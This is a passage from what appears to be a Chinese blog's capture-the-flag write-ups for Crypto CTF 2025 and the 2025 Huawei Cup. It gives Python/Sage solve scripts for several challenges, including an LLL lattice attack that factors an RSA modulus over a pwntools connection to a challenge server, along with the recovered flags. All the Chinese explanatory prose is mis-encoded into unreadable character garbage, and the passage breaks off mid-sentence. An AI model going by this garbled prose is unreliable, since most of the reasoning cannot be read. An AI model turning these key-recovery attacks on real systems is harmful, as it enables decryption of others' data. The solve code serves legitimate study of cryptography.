recover_32(n)#print(decode(p4))#110101000111000011110111000111010010000101100001111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111#...+16=240ä½for i in range(10000,2**18):    s = bin(i)[2:] + &#x27;110101000111000011110111000111010010000101100001111101111110100010100000100010100110101111000001100000011010011011011101001110011100110101111001000101001101011110110111001100100001011111001100001100001010001110110001100001000100110111111111&#x27; + &#x27;1&#x27;*256    q = int(s, 2)    if not (n%q):        print(q)        break#b&#x27;CCTF&#123;M4nch3sReR_c0D!ng_wI7H_RSA&#125;&#x27;#æœ¬é¢˜ç”±è‡ªå·±æä¾›æ€è·¯å’Œä»£ç \n5.Vainratè¿™é¢˜â€¦â€¦æˆ‘éƒ½æƒ³åŸå°ä¸åŠ¨æ”¾åˆ°æˆ‘ä»¬å­¦æ ¡çš„æ ¡èµ›æˆ–è€…ç±»ä¼¼çš„æ¯”èµ›ä¸Šäº†ï¼Œå¦‚æœæˆ‘æœ‰æœºä¼šçš„è¯ã€‚å¤ªé˜´äº†ï¼Œé˜´å¾—æ²¡è¾¹ã€‚æœåŠ¡å™¨åˆ›å»ºç²¾åº¦ä¸º440ä½çš„å®æ•°åŸŸï¼Œæ¯æ¬¡äº¤äº’æ—¶ï¼Œè¾“å…¥cè·å–æœ€æ–°çš„yå€¼ï¼Œè¾“å…¥qé€€å‡ºã€‚ä½†æ˜¯ï¼Œåªæœ‰å°è¯•çš„æ¬¡æ•°è¶³å¤Ÿå¤šï¼Œæ‰èƒ½æŠ“åˆ°è€é¼ ï¼Œå¾—åˆ°ä½ç½®ï¼Œè‡³å°‘éœ€è¦20æ¬¡å°è¯•ä»¥åï¼Œæ‰èƒ½ç¨³å®šè·å¾—yã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯å¾—åˆ°x0ï¼Œä¹Ÿå°±æ˜¯flagè½¬ä¸ºæ•´æ•°åå‰é¢åŠ å°æ•°ç‚¹ã€‚ç”±äºæ¯æ¬¡æ±‚å¹³å‡æ•°å’Œå¼€æ–¹éƒ½ä¼šæœ‰ç²¾åº¦æŸå¤±ï¼Œæœ€åå¯èƒ½ä¸èƒ½ä¸€æ¬¡è§£å‡ºå®Œæ•´çš„flagï¼Œéœ€è¦ä¿®æ­£ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦ä»å¯ä»¥å¾—åˆ°çš„yiä¸­ï¼Œè·å¾—ä¸Šä¸€æ­¥çš„ä¿¡æ¯ï¼Œç›´åˆ°æœ€ç»ˆçš„x0ã€‚ç ”ç©¶ä¸€ä¸‹rat()å‡½æ•°ï¼šç¬¬ä¸€è¡Œå°†xå’Œyæ±‚å¹³å‡æ•°ï¼Œç¬¬äºŒè¡Œå°†ä¸Šä¸€æ­¥çš„xå’Œyæ±‚å‡ ä½•å¹³å‡æ•°ï¼Œæœ€åè¿”å›æ–°çš„xå’Œæ–°çš„yã€‚å¦‚æœç›´æ¥æŠŠä»£ç ä¸¢ç»™AIï¼ŒAIä»¬å¾ˆå®¹æ˜“è¯¯ä»¥ä¸ºè¿™æ®µä»£ç æ˜¯æ±‚xå’Œyçš„ç®—æ•°å¹³å‡æ•°(AM)å’Œå‡ ä½•å¹³å‡æ•°(GM)ï¼Œå¹¶å°†AMèµ‹ç»™xï¼ŒGMèµ‹ç»™yã€‚å› ä¸ºè¢«AIé˜´äº†å¯¼è‡´æ²¡åšå‡ºæ¥ï¼Œå…¶å®ä¸éš¾çš„ã€‚ä»¥åŠï¼Œå¤šæ¬¡è¯•éªŒä¼šå‘ç°ï¼Œyä¼šè¶Šæ¥è¶Šå°ã€‚å¦‚æœå½“æˆAMGMï¼Œé‚£æ¯ä¸ªyéƒ½åº”è¯¥å°äºå¯¹åº”çš„xï¼Œè¿™æ ·yåº”è¯¥è¶Šæ¥è¶Šå¤§ã€‚æˆ‘å…ˆå¾—åˆ°ä¸¤ç»„è¿ç»­çš„yã€‚è¿™é‡Œè¿æ°”ä¸é”™å¾—åˆ°äº†$y_{19}$å’Œ$y_{20}$ï¼Œå¦‚æœæ²¡å¾—åˆ°$y_{19}$ï¼Œæ‹¿$y_{21}$ä¹Ÿä¸€æ ·ã€‚æˆ‘ä»¬æœ‰å…¬å¼$x_i = \\frac{(x_{i-1} + y_{i-1})}{2}$ï¼Œ$y_i = \\sqrt{x_i y_{i-1}}$ã€‚å› æ­¤ï¼Œæ ¹æ®è¿ç»­çš„$y_i$ï¼Œ$y_{i-1}$ï¼Œå¯ä»¥å¾—åˆ°$x_i = \\frac{y_i^2}{y_{i-1}}$ã€‚è¿™æ ·æˆ‘ä»¬å°±æœ‰äº†ä¸€ç»„$x_i$å’Œ$y_i$ã€‚æœ‰äº†$x_i$å’Œ$y_i$ï¼Œå°±æœ‰$y_{i-1} = \\frac{y_i^2}{x_i}$ï¼Œ$x_{i-1} = 2x_i - y_{i-1} = 2x_i - \\frac{y_i^2}{x_i}$ï¼Œå†™å‡ºå‡½æ•°ã€‚å› ä¸ºæ‡’å¾—æ‰“ç†å˜é‡æ‰€ä»¥å³ä½¿xå›åˆ°$x_0$äº†å˜é‡åè¿˜æ˜¯x19ï¼ˆï¼‰æ€»ä¹‹è¿™æ ·å°±èƒ½å¾—åˆ°x0äº†ã€‚ä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“flagæœ‰å¤šå°‘ä½ï¼Œæ‰€ä»¥éœ€è¦ä¸€ä½ä¸€ä½å°è¯•ï¼Œè½¬æˆæ¯”ç‰¹åå…¨éƒ½æ˜¯å¯æ‰“å°å­—ç¬¦çš„/ä»¥CCTFå¼€å¤´çš„å°±æ˜¯å¯èƒ½çš„è§£ã€‚\n#Crypto CTF https://cr.yp.toc.tf/ vainraté¢˜è§£from decimal import *from Crypto.Util.number import long_to_bytes&#x27;&#x27;&#x27;def rat(x, y):\tx = R(x + y) * R(0.5)\ty = R((x * y) ** 0.5) #è¿™ä¸ªxæ˜¯ä¸Šä¸€æ­¥çš„x!ä¹Ÿå°±æ˜¯ç®—æ•°å¹³å‡æ•°ï¼Œè€Œä¸æ˜¯å‚æ•°x\treturn x, y&#x27;&#x27;&#x27;getcontext().prec = 460def return_previous(x:Decimal,y:Decimal)-&gt;(Decimal, Decimal):    return (Decimal(2)*x - (y**2/x),y**2/x)def is_bytes_printable(data):    &quot;&quot;&quot;    åˆ¤æ–­byteså¯¹è±¡æ˜¯å¦å¯æ‰“å°ã€‚    Args:        data: byteså¯¹è±¡ã€‚    Returns:        å¦‚æœbyteså¯¹è±¡å¯æ‰“å°ï¼Œè¿”å›Trueï¼Œå¦åˆ™è¿”å›Falseã€‚    &quot;&quot;&quot;    for byte in data:        if not (32 &lt;= byte &lt;= 126):  # æ£€æŸ¥æ˜¯å¦åœ¨ASCIIå¯æ‰“å°å­—ç¬¦èŒƒå›´            return False    return Truey20 = Decimal(&#x27;0.850721739388853613891153549431010808552676731821999538996176033215422247824841783375972792896987047341958120004524577777036176502090&#x27;)y19 = Decimal(&#x27;0.850721739389079303159246072119468136821544049380443888847082554769733382902933214834218375079868150945588972107307455168793172804985&#x27;)y0 = Decimal(&#x27;0.939435784300590373652615235586222521209371224933347916892430414723880727978737194445756901098227178356345123621981413057062575844130&#x27;)x19 = Decimal(2)*y20**Decimal(2)/y19 - y19for i in range(19):    x19,y19 = return_previous(x19,y19)print(&quot;x = &quot;, x19, &quot;y = &quot;, y19)assert abs(y0 - y19) &lt;Decimal(&quot;0.0000000000000000000000000000000000000000000000000000001&quot;)for i in range(1,461):    res = int(x19*(10**i))    if(is_bytes_printable(long_to_bytes(res))): print(long_to_bytes(res))#CCTF&#123;h3Ur1s7!c5_anD_iNv4rIanTs_iN_CryptoCTF_2025!&#125;#æœ¬é¢˜ç”±ChatGPTå’ŒDeepseekæä¾›é”™è¯¯æ€è·¯ï¼Œè‡ªè¡Œè°ƒè¯•å¾—åˆ°æ€è·¯å’Œä»£ç \n6.Matemithflagåˆ†æˆäº†é•¿ä¸º14çš„æ®µï¼Œä½†æ˜¯ä¸çŸ¥é“æœ‰å¤šå°‘æ®µï¼Œç”±äºåé¢ä½¿ç”¨äº†M[0]åˆ°M[5]ï¼Œæˆ‘ä»¬å°±å‡è®¾å®ƒæœ‰6æ®µå§ã€‚fåˆ°kå…±6ä¸ªå‡½æ•°ï¼Œæ¬¡æ•°éƒ½æ˜¯2~3æ¬¡ï¼Œå˜é‡ä¹Ÿå¾ˆå¤šï¼Œæ‰€æœ‰çš„ç³»æ•°éƒ½æ˜¯å°äºæŸä¸ª313ä½è´¨æ•°pçš„éšæœºæ•°ã€‚ç„¶åï¼Œå°†æ¯ä¸ªå‡½æ•°è½¬æ¢åˆ°æœ‰ç†æ•°åŸŸRä¸Šï¼Œä»£å…¥uåˆ°zä¸ºM[0]åˆ°M[5]ï¼Œè®¡ç®—å‡ºç»“æœå­˜å…¥CNSTã€‚ä¾‹ï¼šf(M[0], M[1], M[2], M[3], M[4], M[5]) = COEFS[0] * M[0] * M[1] + COEFS[1] * M[0] + COEFS[2] * M[1]ä¹‹åå¯¹äºæ¯ä¸€ä¸ªå‡½æ•°éƒ½åŠ ä¸Šä¸€ä¸ªå¸¸æ•°é¡¹ï¼Œå¸¸æ•°é¡¹æ˜¯på‡å»ä¸Šé¢çš„è®¡ç®—ç»“æœï¼Œå†æ¨¡pï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æ¨¡pçš„æ„ä¹‰ä¸‹ï¼Œæ¯ä¸ªå‡½æ•°éƒ½æ»¡è¶³function(M[0], M[1], M[2], M[3], M[4], M[5])-CNST[function] â‰¡ 0 (mod p)å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ±‚å‡ºæ»¡è¶³å…­ä¸ªåŒä½™æ–¹ç¨‹çš„è§£ï¼Œå¹¶é€‰å‡ºé•¿åº¦å‡ä¸º14å­—èŠ‚çš„æ•´æ•°ç»“æœã€‚ç”±äºæ–¹ç¨‹è¾ƒå¤šï¼Œå˜é‡è¾ƒå¤šï¼Œæ¬¡æ•°ä¹Ÿè¾ƒé«˜ï¼Œå¯ä»¥åˆ†æ‰¹æ±‚è§£ã€‚è§‚å¯Ÿå‘ç°ï¼Œå‡½æ•°f, h, jåªæœ‰u,v,wä¸‰ä¸ªå˜é‡ï¼Œå¯ä»¥è§£å‡ºå®ƒä»¬ã€‚åˆ©ç”¨Sagemathçš„æ±‚è§£å™¨è¿›è¡Œæ±‚è§£ï¼Œæœ‰ä¸€ä¸ªæ˜æ˜¾çŸ­çš„ç»“æœï¼Œå†ç”¨u,v,wä»£å…¥å¦å¤–ä¸‰ä¸ªæ–¹ç¨‹ï¼Œè¿™æ ·å°±åªå‰©ä¸‰ä¸ªå˜é‡ï¼ŒåŒæ ·å¯ä»¥è§£å‡ºã€‚\n#Crypto CTF https://cr.yp.toc.tf/ matemithé¢˜è§£from Crypto.Util.number import *# å®šä¹‰æ¨¡æ•° pp = 9892984422801315119260311427714389408772405421306235794826917610128461644036928139298330716261F = GF(p)  # åˆ›å»ºæœ‰é™åŸŸ# å°†ç³»æ•°è½¬æ¢ä¸ºæœ‰é™åŸŸå…ƒç´ a1 = F(8593371583346286129538282168765198524220954884352992069219549555526097253129502925759872761483)b1 = F(8192555264287905175212103898575474256555217842060435386769432116145712989123062847161390929397)c1 = F(9598573789403814092125115160545174167539204328557118715540593719644188998531033259685435430387)d1 = F(5738603225260621554442220996093767502015758942320213371600986432070445300427944977409453429117)a2 = F(6107224904478508858527197508483774405356161856691777460732363192128980355274418091837270668258)b2 = F(3584245173493717638976874408629921683995390608944250077841702023698807664457252845973088744491)c2 = F(5646173287331462026544218972062953582608380797148923127395811758145598594972832047259631339566)d2 = F(1994681139685786114971936867358158466232859433926848067961874687630342141141862187589124089741)a3 = F(1912186465211454827473018892315659311053527670028135595953520151335825509122313783795561869379)b3 = F(6246883466276200389231653597272295993565421216541002743075041326054203024921176043191679609212)c3 = F(4002308425802254921531592700910138281674785127934610897914017993007060136199147207365547047048)d3 = F(973159800079995512996976852328990077106942094656694887771601292254542762394381629810393447820)# å£°æ˜å¤šé¡¹å¼ç¯å’Œå˜é‡R.&lt;u,v,w&gt; = PolynomialRing(F)# å®šä¹‰æ–¹ç¨‹f = a1*u*v + b1*u + c1*v + d1h = a2*u*w + b2*u + c2*w + d2j = a3*v*w + b3*v + c3*w + d3# åˆ›å»ºç†æƒ³I = R.ideal([f, h, j])# è®¡ç®—è§£é›†solutions = I.variety()# è¾“å‡ºç»“æœif solutions:    print(f&quot;æ‰¾åˆ° &#123;len(solutions)&#125; ä¸ªè§£:&quot;)    for i, sol in enumerate(solutions, 1):        # éªŒè¯è§£        f_val = f.subs(sol)        h_val = h.subs(sol)        j_val = j.subs(sol)        print(f&quot;\\néªŒè¯: f=&#123;f_val&#125;, h=&#123;h_val&#125;, j=&#123;j_val&#125;&quot;)        print(f&quot;è§£ &#123;i&#125;:&quot;)        print(f&quot;u = &#123;sol[u]&#125;, &#123;long_to_bytes(int(sol[u]))&#125;&quot;)        print(f&quot;v = &#123;sol[v]&#125;,  &#123;long_to_bytes(int(sol[v]))&#125;&quot;)        print(f&quot;w = &#123;sol[w]&#125;,  &#123;long_to_bytes(int(sol[w]))&#125;&quot;)        else:    print(&quot;æœªæ‰¾åˆ°è§£&quot;)# å·²çŸ¥çš„ u, v, w å€¼u = F(1078804227986401794161149736863793)v = F(2033644392583863279506423899386719)w = F(1631639702310041336611888741434165)# å°†ç³»æ•°è½¬æ¢ä¸ºæœ‰é™åŸŸå…ƒç´ # g çš„ç³»æ•°a1 = F(7737077144206080155196706693824644356475708615710271404071364943161652008584970269394416250641)a2 = F(6282097687310252658473848438985225466620614743750918909885172321224925965646628839166491648752)a3 = F(7737077144206080155196706693824644356475708615710271404071364943161652008584970269394416250641)a4 = F(3354788147890488743832873565215769634619909759459203496980671578348799162553954862104978291860)a5 = F(2560270290674636359252235177920929027441112715609783111306743340637878970846852799006820932563)# i çš„ç³»æ•°b1 = F(7622670835797214156123791992548663880284352234566921286637648219243086701251627093499322050472)b2 = F(6026769215097777844835562389865313764490318485655789123763637718591748620654875700763740623760)b3 = F(8145050175261359549200629067766090532616263522561328878195831921153188650784907223634130346224)b4 = F(3622105614070476540808786980829452605696331317022729645355376801209444137548670550164418237117)b5 = F(4800360746061605999597274870855047707130861888252519642520437605796496240599924899885487900040)# k çš„ç³»æ•°c1 = F(1423338294606985951732736428034353751447528399559929388138157330118213387990891693204997290038)c2 = F(784018806462384388182217012266169299116410899849461442885543245867941419322406775218178098109)c3 = F(7684681843989505989596042520590550892565982707534588920361260899638313817214040416765327284778)c4 = F(4982848574842913858489870338816729222210785430242027484672099513487039514577513464674726403409)c5 = F(7781690757622738625626304200561818137843970209349935834539461705684625161407233281360563620790)# å®šä¹‰å¤šé¡¹å¼ç¯R.&lt;x, y, z&gt; = PolynomialRing(F)# ä»£å…¥å·²çŸ¥çš„ u, v, w åï¼Œg, i, k æˆä¸ºå…³äº x, y, z çš„æ–¹ç¨‹g = a1 * u * x * y + a2 * v + a3 * x + a4 * y + a5i = b1 * v * y * z + b2 * w + b3 * y + b4 * z + b5k = c1 * w * x * z + c2 * u + c3 * x + c4 * z + c5# åˆ›å»ºç†æƒ³I = R.ideal([g, i, k])# æ±‚è§£æ–¹ç¨‹ç»„solutions = I.variety()# è¾“å‡ºç»“æœif solutions:    print(f&quot;æ‰¾åˆ° &#123;len(solutions)&#125; ä¸ªè§£:&quot;)    for idx, sol in enumerate(solutions):        print(f&quot;\\nè§£ &#123;idx + 1&#125;:&quot;)        print(f&quot;x = &#123;sol[x]&#125;&quot;)        print(f&quot;y = &#123;sol[y]&#125;&quot;)        print(f&quot;z = &#123;sol[z]&#125;&quot;)                # éªŒè¯è§£        g_val = g.subs(sol)        i_val = i.subs(sol)        k_val = k.subs(sol)        print(f&quot;éªŒè¯: g=&#123;g_val&#125;, i=&#123;i_val&#125;, k=&#123;k_val&#125;&quot;)else:    print(&quot;æœªæ‰¾åˆ°è§£&quot;)#CCTF&#123;50lv!n6_7H3_H1dD3n__num8Ers_Pr08l3m_f0r_C51dH_4nd_C5uRf_v14_4uT0m473d_C0pp3r5m17h!!?&#125;#æœ¬é¢˜ç”±Deepseekæä¾›ä»£ç \nåè®°è¦å­¦çš„ä¸œè¥¿å¥½å¤šå‘¢â€¦â€¦è™½ç„¶é AIèƒ½è¾…åŠ©ä¸€éƒ¨åˆ†åˆ†æå’Œä»£ç å·¥ä½œï¼Œä¸è¿‡æ›´å¤šçš„è¿˜æ˜¯å¾—é è‡ªå·±&gt;_&lt;\nä¸€å¹´æ¥éƒ½åœ¨æµ…æ°´åŒºé—²é€›ï¼Œæ ¼ç›¸å…³çš„ä¸œè¥¿å‡ ä¹éƒ½ä¸äº†è§£ï¼Œè™½ç„¶ä¹Ÿç»å¸¸å‚è€ƒåˆ«çš„å¸ˆå‚…çš„é¢˜è§£å§ï¼Œä¸è¿‡å¤§å¤šéƒ½çœ‹ä¸å¤ªæ‡‚ï¼Œäºæ˜¯æˆ‘å°±å¸Œæœ›å†™ç»†è‡´ä¸€ç‚¹ï¼Œæ¥è®¿çš„æœ‹å‹èƒ½çœ‹å¾—å®¹æ˜“äº›ã€‚æ­£å¥½ä¹Ÿå°è¯•ä¸€ä¸‹Hexoçš„å…¬å¼ï¼Œä¸ºäº†æ­£å¸¸æ˜¾ç¤ºå®ƒä»¬ä¹Ÿæ˜¯è´¹äº†ä¸€ç•ªå¿ƒæ€hhh\n","categories":["ç¬”è®°"],"tags":["CryptoCTF","Writeup","2025"]},{"title":"2025 åä¸ºæ¯Cryptoé¢˜è§£","url":"/2025/10/29/2025%20%E5%8D%8E%E4%B8%BA%E6%9D%AF%E9%A2%98%E8%A7%A3/","content":"å‰è¨€è¿™æ¯”èµ›â€¦â€¦æ€ä¹ˆè¯´å‘¢ï¼ŒæŒºæçš„ï¼Œå»¶æœŸåˆå»¶æœŸï¼Œå»¶åˆ°ä¸€ä¸ªå’±ä¸€æ•´å¤©è¯¾çš„æ—¥å­ï¼Œäºæ˜¯ä¸€ä¸Šåˆéƒ½æ²¡çœ‹ï¼›ä¸­åˆåƒç“œåƒåˆ°å¤§å®¶ä¹ç‚¹é’Ÿå‡†æ—¶ç™»å½•å¹³å°å‘ç°ä¸€é“é¢˜æ²¡æœ‰ï¼Œç›´åˆ°å¤§æ¦‚40åˆ†é’Ÿåæ‰æœ‰é¢˜ï¼Œå†åŠ ä¸Šä¸€äº›å…¶ä»–çš„å†²çªï¼Œæ€»ä¹‹ä¸å°‘é€‰æ‰‹æ€¨å£°è½½é“çš„ã€‚\nä¸è¿‡ç ”ç©¶ç”Ÿå°±æ˜¯å¥½å•Šï¼Œå…ˆå‰æ‰“çš„ä¸€å †æ¯”èµ›ç»™æˆ‘æ‰“è‡ªé—­äº†ï¼Œä¸€é“é¢˜åšä¸å‡ºæ¥å‚ä¸æ„Ÿ0ï¼Œè¿™ä¸‹è‡³å°‘èƒ½åšå‡ é“å¯†ç äº†ã€‚ä½†æ˜¯ç­¾åˆ°é¢˜æ€ä¹ˆäº¤éƒ½äº¤ä¸ä¸Šå»ï¼Œæˆ‘ä¸æ˜ç™½ï¼Œè¿™ç¡®å®å¾—éª‚ä¸€éª‚ä¸»åŠæ–¹å§ã€‚\næ­£æ–‡srsa 100ptimport osimport ptyfrom Crypto.Util.number import *from secret import flagmenu = &quot;&quot;&quot;[1] Get Public Key[2] Get Ciphertext[3] Get Gift[4] Exit&quot;&quot;&quot;if __name__ == &quot;__main__&quot;:    m = bytes_to_long(flag)    p = getPrime(512)    q = getPrime(512)    e = getPrime(64)    cnt = 0    while True:        try:            print(menu)            choice = int(input(&quot;Your choice: &quot;))            if choice == 1:                n = p * q                print(f&quot;n = &#123;n&#125;&quot;)                print(f&quot;e = &#123;e&#125;&quot;)            elif choice == 2:                n = p * q                c = pow(m, e, n)                print(f&quot;c = &#123;c&#125;&quot;)            elif choice == 3:                if cnt == 2:                    print(&quot;You know too much!!!&quot;)                    continue                k = getPrime(384)                r = getPrime(128)                gift = k * p + r                print(f&quot;&#123;gift = &#125;&quot;)                cnt += 1            elif choice == 4:                print(&quot;Bye!&quot;)                break            else:                print(&quot;Invalid choice&quot;)        except:            print(&quot;You can&#x27;t do this!&quot;)            break\nä¸€é“RSAï¼Œç»™å‡ºäº†n, e, cå’Œä¸¤ä¸ªå…³äºpçš„giftã€‚ç›´æ¥ä¸¢ç»™Geminiï¼Œå®ƒå¸®åŠ©æˆ‘åˆ†æäº†æ¯ä¸ªå˜é‡ï¼Œç„¶åé€ äº†æ ¼ï¼ˆï¼‰å•å‡­æˆ‘åº”è¯¥æ˜¯æƒ³ä¸åˆ°çš„ã€‚\nå·²çŸ¥ï¼š$n=pq$ï¼Œ$gift_1=k_1p+r_1$ï¼Œ$gift_2=k_2p+r_2$ï¼Œå› æ­¤å°†$p$æ¢æˆ$n/q$ï¼Œåˆ™æœ‰$gift_1\\times q=k_1n+r_1q$ï¼Œ$gift_2$åŒç†ï¼Œå› æ­¤æ„é€ çŸ©é˜µ$\\begin{bmatrix} n &amp; 0 &amp; 0\\newline 0 &amp; n &amp; 0\\newline gift1 &amp; gift2 &amp; 1\\end{bmatrix}$ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªæ ¼ï¼Œæ»¡è¶³å…³ç³»å¼\n\\left[-k_1,-k_2,q\\right]\\begin{bmatrix}\n n & 0 & 0\\newline\n 0 & n & 0\\newline\n gift1 & gift2 & 1\n\\end{bmatrix}=[qr_1,qr_2,q]ç®€å•æä¸€å˜´æ ¼åŸºè§„çº¦(LLL)ï¼Œå®ƒçš„ä½œç”¨æ˜¯ä»â€œå¤§â€çš„åŸºä¸­æ‰¾åˆ°â€œæ›´å°â€çš„åŸºï¼Œæˆ‘ä»¬ç°åœ¨æœ‰ä¸€ä¸ªä¸‰é˜¶çŸ©é˜µï¼ˆä¸‰ä¸ªè¡Œå‘é‡ï¼‰å¼ æˆçš„ç©ºé—´ï¼Œä½†æ˜¯æ¯ä¸ªåŸºå‘é‡éƒ½å¤ªé•¿äº†ï¼Œnæ˜¯1024ä½æ•°ï¼Œgiftéƒ½æ˜¯896ä½æ•°ï¼Œå› æ­¤ç¬¬ä¸€è¡Œå’Œç¬¬äºŒè¡Œå‘é‡çš„é•¿åº¦å‡ä¸º$2^{1024}$ï¼Œç¬¬ä¸‰è¡Œé•¿åº¦ä¸º$\\sqrt{(gift_1)^2+(gift_2)^2+1}\\approx2^{896}$ï¼Œè€Œæˆ‘ä»¬é€šè¿‡ä¸Šé¢çš„å…³ç³»å¼å¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªç©ºé—´å¯ä»¥ç”¨ä¸€ç»„æ›´å°çš„åŸºå‘é‡è¡¨ç¤ºï¼Œè¿™ç»„åŸºå‘é‡æœ‰ä¸€ä¸ªâ€”â€”ä¹Ÿå°±æ˜¯$[qr_1,qr_2,q]$ï¼Œå®ƒå¼‚å¸¸çŸ­ï¼Œé•¿åº¦åªæœ‰$\\sqrt{(qr_1)^2+(qr_2)^2+q^2}\\approx2^{640}$ï¼Œåœ¨ä¸€ä¸ªåŸºå‘é‡éƒ½å¾ˆå¤§çš„ç©ºé—´é‡Œï¼Œè¿™æ˜¯å¾ˆç½•è§çš„ã€‚\nä»¥åŠç”±äºæ ¼åŸºè§„çº¦çš„æ€§è´¨ï¼Œå®ƒå€¾å‘äºæ‰¾åˆ°ä¸‰ä¸ªåˆ†é‡å·®ä¸å¤šçš„åŸºï¼Œå› æ­¤å¯ä»¥å°†çŸ©é˜µå³ä¸‹è§’é‚£ä¸ª1æ”¹æˆ$2^{128}$ï¼Œè¿™æ ·ä¸‰ä¸ªåˆ†é‡é•¿åº¦å°±å·®ä¸å¤šäº†ï¼Œæ›´å®¹æ˜“æ‰¾åˆ°è¿™ç»„åŸºã€‚è¿˜å¥½æœ¬é¢˜çš„å°åŸºå·®è·å¾ˆæ˜æ˜¾ï¼Œä¸ä¼˜åŒ–ä¹Ÿèƒ½æˆåŠŸã€‚\nè§£å‡ºqä¹‹åRSAéƒ¨åˆ†å°±ä¸æäº†ï¼Œæœ€ç»ˆçš„ä»£ç å¦‚ä¸‹ã€‚\nfrom Crypto.Util.number import *from pwn import *conn = remote(&#x27;192.168.18.25&#x27;, 9999)conn.sendafter(b&#x27;Your choice: &#x27;, b&#x27;1\\n&#x27;)conn.recvuntil(b&#x27;n = &#x27;)n = int(conn.recvline())conn.recvuntil(b&#x27;e = &#x27;)e = int(conn.recvline())conn.sendafter(b&#x27;Your choice: &#x27;, b&#x27;2\\n&#x27;)conn.recvuntil(b&#x27;c = &#x27;)c = int(conn.recvline())conn.sendafter(b&#x27;Your choice: &#x27;, b&#x27;3\\n&#x27;)conn.recvuntil(b&#x27;gift = &#x27;)gift_1 = int(conn.recvline())conn.sendafter(b&#x27;Your choice: &#x27;, b&#x27;3\\n&#x27;)conn.recvuntil(b&#x27;gift = &#x27;)gift_2 = int(conn.recvline())# --------------------------------------------------# LLL æ”»å‡»å®ç°# --------------------------------------------------print(&quot;å¼€å§‹æ„å»ºæ ¼...&quot;)# 1. æ„å»ºæ ¼çŸ©é˜µ B#    [ n,    0,    0 ]#    [ 0,    n,    0 ]#    [ gift_1, gift_2, 1 ]B = Matrix(ZZ, [    [n, 0, 0],    [0, n, 0],    [gift_1, gift_2, 1]])print(&quot;æ ¼çŸ©é˜µ B:&quot;)print(B)# 2. è¿è¡Œ LLL ç®—æ³•print(&quot;\\næ­£åœ¨è¿è¡Œ LLL ç®—æ³•...&quot;)# B.LLL() è¿”å›ä¸€ä¸ªæ–°çš„ï¼ˆçº¦ç®€åçš„ï¼‰åŸºB_reduced = B.LLL()print(&quot;LLL çº¦ç®€åçš„åŸº (B_reduced):&quot;)print(B_reduced)# 3. æå– q# LLL æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªå‘é‡ (B_reduced[0]) åº”è¯¥å°±æ˜¯æˆ‘ä»¬å¯»æ‰¾çš„çŸ­å‘é‡# v_target = (q*r1, q*r2, q)# æ‰€ä»¥ï¼Œç¬¬ä¸‰ä¸ªåˆ†é‡å°±æ˜¯ q (æˆ– -q)q = abs(B_reduced[0][2])print(&quot;\\n--- ç»“æœ ---&quot;)# 4. éªŒè¯å’Œåˆ†è§£ nif n % q == 0 and q &gt; 1 and q &lt; n:    p = n // q    print(f&quot;[+] æˆåŠŸæ‰¾åˆ° p å’Œ qï¼&quot;)    print(f&quot;p = &#123;p&#125;&quot;)    print(f&quot;q = &#123;q&#125;&quot;)    # æœ€ç»ˆéªŒè¯    if p * q == n:        print(&quot;[+] éªŒè¯æˆåŠŸ: p * q == n&quot;)    else:        print(&quot;[-] éªŒè¯å¤±è´¥: p * q != n&quot;)else:    print(f&quot;[-] LLL æ”»å‡»å¤±è´¥ã€‚&quot;)    print(f&quot;æå–åˆ°çš„ q = &#123;q&#125;&quot;)    print(&quot;[-] q ä¸æ˜¯ n çš„æœ‰æ•ˆå› å­ã€‚è¯·æ£€æŸ¥ n å’Œ gifts æ˜¯å¦æ­£ç¡®ã€‚&quot;)    exit(0)conn.close()assert n%q == 0p = n//q# 2. è®¡ç®—æ¬§æ‹‰å‡½æ•° Ï†(n)phi_n = (q - 1)*(p - 1)# 3. è®¡ç®— d (e çš„æ¨¡ Ï†(n) çš„ä¹˜æ³•é€†å…ƒ)d = inverse(e, phi_n)print(&quot;d = &quot;,d)# 4. è§£å¯†æ¶ˆæ¯ mm = pow(c, d, n)  # å¿«é€Ÿæ¨¡å¹‚è¿ç®—print(&quot;è§£å¯†åçš„æ¶ˆæ¯ m ä¸º:&quot;, long_to_bytes(m))\nSign4Flag 200ptimport osimport ptyfrom Crypto.Util.number import *from gmssl import sm2, funcfrom hashlib import *from secret import flag, private_key, public_keysm2_crypt = sm2.CryptSM2(private_key=private_key, public_key=public_key)def sign(msg):    signature = sm2_crypt.sign(md5(msg).digest(), os.urandom(32).hex())    return signaturedef verify(msg, sig):    return sm2_crypt.verify(sig, md5(msg).digest())def login(usrname, passwd, sig):    if usrname != usr:        return False    if not verify(long_to_bytes(passwd), sig):        return False    return Truemenu = &quot;&quot;&quot;Flag management system[1] Sign in[2] Register[3] Forgot password[4] Exit&quot;&quot;&quot;usr = &quot;admin&quot;a = getPrime(64)sig = sign(long_to_bytes(13337))if __name__ == &quot;__main__&quot;:    while True:        try:            print(menu)            op = input(&quot;&gt; &quot;)            if op == &quot;1&quot;:                username = input(&quot;Username: &quot;)                password = int(input(&quot;Password: &quot;))                if login(username, password, sig):                    print(f&quot;Welcome admin! Here is your flag: &#123;flag[:GCD(password, a)]&#125;&quot;)                else:                    print(&quot;Wrong username or password!&quot;)                break            elif op == &quot;2&quot;:                print(&quot;Sorry, registration is closed.&quot;)            elif op == &quot;3&quot;:                tmp = int(input(&quot;New password &gt; &quot;))                tmp2 = int(input(&quot;Security number &gt; &quot;))                if not isPrime(tmp):                    print(&quot;Password must be prime!&quot;)                    continue                if tmp2 &gt;= tmp:                    print(&quot;Security number too large!&quot;)                    continue                if tmp2 &lt;= 0:                    print(&quot;Security number invalid!&quot;)                    continue                sig = sign(long_to_bytes(tmp))                a = tmp2                print(&quot;Password changed!&quot;)            elif op == &quot;4&quot;:                print(&quot;Bye~&quot;)                break            else:                print(&quot;Invalid option!&quot;)        except:            print(&quot;Something wrong&quot;)            break\né¢˜ç›®å¯ä»¥é‡ç½®å¯†ç å’Œaï¼Œä½†æ˜¯å¯†ç ä¸€å®šæ˜¯è´¨æ•°ï¼Œaå°äºå¯†ç ï¼Œè¿™æ 